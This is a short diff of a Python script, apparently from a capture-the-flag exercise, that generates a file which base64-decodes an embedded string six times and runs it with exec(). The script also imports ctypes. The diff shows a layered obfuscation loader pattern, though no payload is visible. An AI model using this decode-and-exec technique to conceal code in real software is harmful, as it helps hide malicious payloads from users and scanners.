@@ -1,4 +1,4 @@
-# 2023-06-09 ffctf
+# 2023-06-18 ffctf
 import base64
 import ctypes
 import os
@@ -77,10 +77,10 @@ file.write("""
 import base64
 import ctypes
 
-Code=\""""'' +Code+ '' """\"
+Code1=\""""'' +Code+ '' """\"
 for j in range(1,7):
-    Code=base64.b64decode(Code)
-exec(Code)
+    Code1=base64.b64decode(Code1)
+exec(Code1)
 """)
 
 file.close()
